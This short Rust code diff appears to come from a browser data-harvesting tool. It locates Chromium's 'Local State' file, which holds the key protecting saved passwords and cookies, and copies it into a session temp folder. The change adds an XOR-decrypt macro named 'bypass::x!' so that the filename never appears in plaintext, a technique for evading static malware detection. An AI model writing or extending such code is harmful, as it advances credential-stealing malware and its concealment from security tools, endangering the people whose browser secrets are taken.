@@ -156,12 +156,21 @@ impl Browser {
     /// Local State sits at the installation root (Go: `buildHints`).
     fn build_hints(&self, session: &Session) -> Hints {
         let mut local_state_path = PathBuf::new();
-        let candidate = Path::new(&self.cfg.user_data_dir).join("Local State");
+        // Statement-local decrypt; the leaf filename never lands plaintext.
+        let candidate =
+            Path::new(&self.cfg.user_data_dir).join(bypass::x!("Local State", 0x9E).as_str());
         if candidate.is_file() {
-            let dst = session.temp_dir().join("Local State");
+            let dst = session
+                .temp_dir()
+                .join(bypass::x!("Local State", 0x9E).as_str());
             match session.acquire(&candidate, &dst, false) {
                 Ok(()) => local_state_path = dst,
-                Err(e) => log::debug!("acquire Local State for {}: {}", self.cfg.name, e),
+                Err(e) => log::debug!(
+                    "acquire {} for {}: {}",
+                    bypass::x!("Local State", 0x9E),
+                    self.cfg.name,
+                    e
+                ),
             }
         }
 
